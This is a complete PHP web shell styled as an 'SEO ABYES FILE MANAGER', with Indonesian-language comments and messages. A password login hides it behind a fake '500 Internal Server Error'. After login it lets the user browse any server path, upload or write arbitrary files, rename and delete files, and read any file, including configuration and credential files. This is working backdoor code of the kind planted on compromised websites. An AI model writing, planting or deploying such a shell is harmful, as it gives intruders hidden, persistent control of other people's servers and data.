<?php
session_start();

// ============================
// CONFIG PASSWORD
// ============================
$hashKunci = '$2a$12$CXgybVjgyNm6NK2E9j43IOXhfoKIDyZs6uL4QzGpR1YGLFwqW86HG'; // ganti hash sesuai password kamu

// ============================
// LOGIN SYSTEM
// ============================
if (!isset($_SESSION['logged_in'])) {
    $input = $_POST['text'] ?? null;
    if (!$input) {
        echo '<!DOCTYPE html>
        <html lang="id">
        <head><meta charset="UTF-8"><title>Login</title></head>
        <body style="background:#001f3f; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
            <form method="POST" style="background:#000; padding:30px; border-radius:10px; text-align:center;">
                <h2 style="color:#ffcc00;">File Manager Login</h2>
                <input type="password" name="text" placeholder="Password..." required style="width:100%; padding:10px; margin-top:10px; border-radius:5px; border:none;">
                <button type="submit" style="width:100%; padding:10px; margin-top:10px; background:#ffcc00; color:#001f3f; border:none; border-radius:5px;">Login</button>
            </form>
        </body></html>';
        exit;
    }
    if (!password_verify($input, $hashKunci)) {
        http_response_code(500);
        die("500 Internal Server Error - Password Salah");
    }
    $_SESSION['logged_in'] = true;
}

// ============================
// HELPER FUNCTIONS
// ============================
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function getIcon($path) {
    return is_dir($path) ? 'üìÅ' : 'üìÑ';
}

// ============================
// CURRENT PATH
// ============================
$currentPath = $_GET['d'] ?? getcwd();
if (!is_dir($currentPath)) $currentPath = getcwd();

// ============================
// FILE OPERATIONS
// ============================
if (isset($_POST['upload'])) {
    $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['uploaded_file']['name'];
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) echo "<script>alert('File berhasil diunggah!');</script>";
    else echo "<script>alert('Gagal mengunggah file!');</script>";
}

if (isset($_POST['create_folder'])) {
    $folderName = $_POST['folder_name'];
    if ($folderName && mkdir($currentPath . DIRECTORY_SEPARATOR . $folderName)) echo "<script>alert('Folder berhasil dibuat!');</script>";
    else echo "<script>alert('Gagal membuat folder!');</script>";
}

if (isset($_POST['rename'])) {
    $oldPath = $_POST['rename_path'];
    $newName = $_POST['new_name'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
    if (rename($oldPath, $newPath)) echo "<script>alert('Nama berhasil diubah!');</script>";
    else echo "<script>alert('Gagal mengubah nama!');</script>";
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (is_dir($deletePath)) rmdir($deletePath);
    else unlink($deletePath);
    echo "<script>alert('Berhasil dihapus!');</script>";
}

if (isset($_POST['create_file'])) {
    $newFileName = $_POST['new_file_name'];
    $newFileContent = $_POST['new_file_content'];
    $newFilePath = $currentPath . DIRECTORY_SEPARATOR . $newFileName;
    if (file_put_contents($newFilePath, $newFileContent)) echo "<script>alert('File berhasil dibuat!');</script>";
    else echo "<script>alert('Gagal membuat file!');</script>";
}

if (isset($_GET['view'])) {
    $viewPath = $_GET['view'];
    if (is_file($viewPath)) {
        header('Content-Type: text/plain');
        readfile($viewPath);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>SEO ABYES FILE MANAGER</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<link href="https://fonts.cdnfonts.com/css/qanelas" rel="stylesheet">
<style>
body { background:#001f3f; color:#fff; font-family:'Qanelas', sans-serif; margin:0; padding:0; }
#container { max-width:1000px; margin:20px auto; padding:20px; background:#000; border-radius:10px; }
h2 { color:#ffcc00; text-align:center; }
a { color:#fff; text-decoration:none; }
a:hover { text-decoration:underline; }
.actions button { background:#ffcc00; border:none; color:#001f3f; padding:5px 10px; margin-right:5px; border-radius:5px; cursor:pointer; }
.actions button:hover { background:#3399ff; }
.table-wrapper { max-height:400px; overflow-y:auto; border:1px solid #444; margin-top:10px; }
table { width:100%; border-collapse:collapse; table-layout:fixed; }
th, td { padding:10px; border-bottom:1px solid #444; word-wrap:break-word; }
th { background:#ffcc00; color:#000; position:sticky; top:0; }
tr:nth-child(even) { background:#003366; }
tr:nth-child(odd) { background:#000; }
input, textarea { width:100%; padding:5px; border-radius:5px; border:none; margin-bottom:5px; }
button { cursor:pointer; border-radius:5px; }
#server-info { margin-top:20px; padding:15px; background:#002b5c; border-radius:8px; }
.breadcrumb a { color:white; text-decoration:none; margin-right:5px; }
.breadcrumb i { color:#ffcc00; margin-right:4px; }
</style>
<script>
function toggleCreateFileForm() {
    const f = document.getElementById('create-file-form');
    f.style.display = (f.style.display==='none')?'block':'none';
}
</script>
</head>
<body>
<div id="container">
<h2>SEO ABYES FILE MANAGER</h2>

<!-- Breadcrumb -->
<div class="breadcrumb">
<?php
$parts = explode(DIRECTORY_SEPARATOR, $currentPath);
$pathAcc = '';
foreach ($parts as $i=>$p) {
    $pathAcc .= $p . DIRECTORY_SEPARATOR;
    echo '<a href="?d='.urlencode($pathAcc).'"><i class="fa fa-folder"></i> '.x($p).'</a>';
    if ($i<count($parts)-1) echo ' <i class="fa fa-angle-right"></i> ';
}
?>
</div>

<!-- Upload -->
<form method="POST" enctype="multipart/form-data">
<input type="file" name="uploaded_file" required>
<button type="submit" name="upload"><i class="fas fa-upload"></i> Upload</button>
</form>

<!-- Create Folder -->
<form method="POST">
<input type="text" name="folder_name" placeholder="Folder Name" required>
<button type="submit" name="create_folder"><i class="fas fa-folder-plus"></i> Create Folder</button>
</form>

<!-- Create File -->
<button onclick="toggleCreateFileForm()"><i class="fas fa-file-alt"></i> Create File</button>
<form method="POST" id="create-file-form" style="display:none;">
<input type="text" name="new_file_name" placeholder="File Name" required>
<textarea name="new_file_content" rows="5" placeholder="File Content" required></textarea>
<button type="submit" name="create_file"><i class="fas fa-plus"></i> Save File</button>
</form>

<!-- File Table -->
<div class="table-wrapper">
<table>
<tr><th>Name</th><th>Permission</th><th>Size</th><th>Action</th></tr>
<?php
$files = scandir($currentPath);
foreach($files as $f) {
    if($f=='.'||$f=='..') continue;
    $full = $currentPath.DIRECTORY_SEPARATOR.$f;
    $perm = is_readable($full)?substr(sprintf('%o',@fileperms($full)),-4):'N/A';
    $size = is_file($full)?formatSize(@filesize($full)):'Folder';
    $icon = getIcon($full);
    echo "<tr>
    <td>$icon <a href='?d=".urlencode($full)."'>".x($f)."</a></td>
    <td>$perm</td>
    <td>$size</td>
    <td class='actions'>
    <form method='POST' style='display:inline;'><input type='hidden' name='rename_path' value='".x($full)."'><input type='text' name='new_name' placeholder='New Name'><button type='submit' name='rename'><i class='fas fa-edit'></i></button></form>
    <form method='POST' style='display:inline;'><input type='hidden' name='delete_path' value='".x($full)."'><button type='submit'><i class='fas fa-trash-alt'></i></button></form>";
    if(is_file($full)) echo "<a href='?view=".urlencode($full)."'><button type='button'><i class='fas fa-eye'></i></button></a>";
    echo "</td></tr>";
}
?>
</table>
</div>
<h4 style="color:#ffcc00; text-align:center;">SEO ABYES DIRECTORY 403 v2.0</h4>
</div>
</body>
</html>
